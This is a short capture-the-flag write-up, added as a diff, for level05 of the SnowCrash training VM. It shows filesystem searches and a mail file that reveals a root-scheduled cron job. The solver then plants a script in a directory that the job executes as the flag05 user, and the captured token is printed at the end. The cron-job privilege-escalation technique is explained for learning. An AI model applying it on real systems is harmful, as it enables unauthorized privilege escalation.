@@ -1,0 +1,28 @@
+1/ Try to find anything:
+find / -group flag05 2>/dev/null, find / -group level06 2>/dev/null, find / -name level06 2>/dev/null, find / -name level05 2>/dev/null:
+level05@SnowCrash:~$ find / -name level05 2>/dev/null
+/var/mail/level05
+/rofs/var/mail/level05
+
+2/ Check details of /var/mail/level05
+level05@SnowCrash:/usr/sbin$ cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+=> Cron task "sh /usr/sbin/openarenaserver" running every 2 minutes
+
+3/ level05@SnowCrash:/usr/sbin$ cat /usr/sbin/openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+4/ Put command in file inside folder /opt/openarenaserver/
+testfile: #!/bin/bash getflag > /tmp/test
+after file is running (*/2 * * * * ) flag will be inside /tmp/test
+
+5/ chmod +x /tmp/test to make it executable since bash -x "$i" will check that.
+
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/test
+Check flag.Here is your token : viuaaale9huek52boumoomioc
